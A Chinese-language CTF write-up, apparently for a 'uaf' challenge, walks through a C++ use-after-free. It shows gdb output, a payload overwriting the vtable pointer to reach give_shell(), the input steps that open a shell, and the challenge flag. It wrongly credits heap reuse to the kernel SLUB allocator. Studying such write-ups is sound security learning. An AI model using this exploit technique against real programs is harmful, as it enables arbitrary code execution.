# Heap Exploitation - Use After Free (UAF)


### Source code
Class definitions:
```
class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};
```

Main:
```
int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```


### A. Summary
1. 有 dangling pointer 指向一段已被釋放的空間
2. 利用 Linux kernel SLUB allocator 的特性重新分配同一段空間 (配置同樣大小的空間即可) 並**篡改 vtable**
3. 再次使用 pointer 並讓 ip 跳轉，成功劫持 control flow

### B. Memory layout of a C++ object
1. 在 x86_64 裏，如果一個 class 有 virtual function，它的物件在記憶體中前8 bytes會是 __vfptr，後面是 member variables
2. __vfptr 會指向第一個 virtual function 的 address，後面依序是第二個、第三個。在此之前的8 bytes會是constructor 的位址

這邊以 Man 的物件 `m` 爲例：
```
(gdb) x/6x 0xbf3c50
0xbf3c50:       0x00401570 (__vfptr)  0x00000000      0x00000019 (age)   0x00000000
0xbf3c60:       0x00bf3c38 (name)     0x00000000      

(gdb) x/1s 0xbf3c38
0xbf3c38:       "Jack"
```

畫圖：
```
+-------------+
|   __vfptr   | -> 8 bytes. Pointer to vtable (the first virtual function of Man is `Human::give_shell()`)
+-------------+
|   age: int  | -> 4 bytes
+-------------|
|  (padding)  | -> 4 bytes (x86上任何指標都是 4-byte aligned, x86_64上爲 8-byte aligned)
|-------------+
| name: char* | -> 8 bytes (明明是 std::string，但不知道爲什麼實際上是個 char*)
+-------------+
```

### C. Linux kernel SLUB allocator
> SLUB ("the unqueued slab allocator") is a memory management mechanism intended for the efficient memory allocation of kernel objects which displays the desirable property of eliminating fragmentation caused by allocations and deallocations. The technique is used to retain allocated memory that contains a data object of a certain type for reuse upon subsequent allocations of objects of the same type. It is used in Linux and became the default allocator since 2.6.23.
>
> source: https://en.wikipedia.org/wiki/SLUB_(software)

舉例來說：
```
int* i = new int();
delete i;

char* c = new char[4]; // 實驗結果：可接受範圍 [0, 24]
assert(i == c);
```

### D. Pwn
我想先找出 `m` 的記憶體位址，`__vfptr` 應該會在最前面的 8 bytes。所以首先我們在 Man:Man() 設定中斷點，並執行程式
```
(gdb) b *main+79
Breakpoint 1 at 0x400f13

(gdb) r
Starting program: /home/uaf/uaf

Breakpoint 1, 0x0000000000400f13 in main ()

(gdb) disas main
Dump of assembler code for function main:
   0x0000000000400ec4 <+0>:     push   rbp
   0x0000000000400ec5 <+1>:     mov    rbp,rsp
   0x0000000000400ec8 <+4>:     push   r12
   0x0000000000400eca <+6>:     push   rbx
   0x0000000000400ecb <+7>:     sub    rsp,0x50
   0x0000000000400ecf <+11>:    mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400ed2 <+14>:    mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400ed6 <+18>:    lea    rax,[rbp-0x12]
   0x0000000000400eda <+22>:    mov    rdi,rax
   0x0000000000400edd <+25>:    call   0x400d70 <_ZNSaIcEC1Ev@plt>
   0x0000000000400ee2 <+30>:    lea    rdx,[rbp-0x12]
   0x0000000000400ee6 <+34>:    lea    rax,[rbp-0x50]
   0x0000000000400eea <+38>:    mov    esi,0x4014f0
   0x0000000000400eef <+43>:    mov    rdi,rax
   0x0000000000400ef2 <+46>:    call   0x400d10 <_ZNSsC1EPKcRKSaIcE@plt>
   0x0000000000400ef7 <+51>:    lea    r12,[rbp-0x50]
   0x0000000000400efb <+55>:    mov    edi,0x18
   0x0000000000400f00 <+60>:    call   0x400d90 <_Znwm@plt> --> `operator new`
   0x0000000000400f05 <+65>:    mov    rbx,rax
   0x0000000000400f08 <+68>:    mov    edx,0x19
   0x0000000000400f0d <+73>:    mov    rsi,r12
   0x0000000000400f10 <+76>:    mov    rdi,rbx
=> 0x0000000000400f13 <+79>:    call   0x401264 <_ZN3ManC2ESsi> --> `Man::Man()`
```

這時候 Man::Man() 尚未被呼叫，根據 x86_64 calling convention, 物件的第一個參數會被擺在 rdi

這邊第一個參數就是 `m` 的 address。由以下結果，我們可得知 **m 的記憶體位址：0x666c50**
```
(gdb) p/x $rdi
$1 = 0x666c50
```

接下來執行 Man::Man() ，讓 constructor 把 m 的 vtable 設定進去
```
(gdb) ni
0x0000000000400f18 in main ()
```

再看一下 m (0x666c50) 的內容，得知 **m 的 __vfptr value 是：0x00401570**
```
(gdb) x/6x 0x666c50
0x666c50:       0x00401570 (__vfptr)  0x00000000     0x00000019 (age)     0x00000000
0x666c60:       0x00666c38 (name)     0x00000000
```

我們說 __vfptr 會指向 Man 的第一個 virtual function，也就是 Human::give_shell()

第二個 virtual function 是 Man::introduce()，因爲在 `Man::introduce()` overrides `Human::introduce()`
```
(gdb) x/2a 0x00401570
0x401570 <_ZTV3Man+16>: 0x40117a <_ZN5Human10give_shellEv>      0x4012d2 <_ZN3Man9introduceEv>
```

所以 m->introduce() 在執行的時候，實際上是呼叫了 m 的 __vfptr+8 的 function。

我們可以試着篡改 __vfptr 的值，讓 m->introduce() 呼叫 m->give_shell()

這邊只要讓 __vfptr 的值爲 __vfptr-8 = 0x0000000000401568 就可以了，並寫入檔案。
```
$ python2 -c 'print "\x68\x15\x40\x00\x00\x00\x00\x00"' > /tmp/aesophor_uaf/vt
```

執行程式，分配 24 bytes 的資料（和 m 的大小一樣）並將 0x0000000000401568 讀入我們剛剛重新分配的空間
```
uaf@prowl:~$ ./uaf 24 /tmp/aesophor_uaf/vt
1. use
2. after
3. free
3
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
2
your data is allocated
1. use
2. after
3. free
1
$ 
```

`3 2 2 1` 就可以取得shell。

這邊執行兩次2的原因在於：先 delete m 然後才 delete w。
* 第一次選擇2的時候，資料會讀進 w 的區域
* 第二次選擇2的時候，資料會讀進 m 的區域

flag: `yay_f1ag_aft3r_pwning`
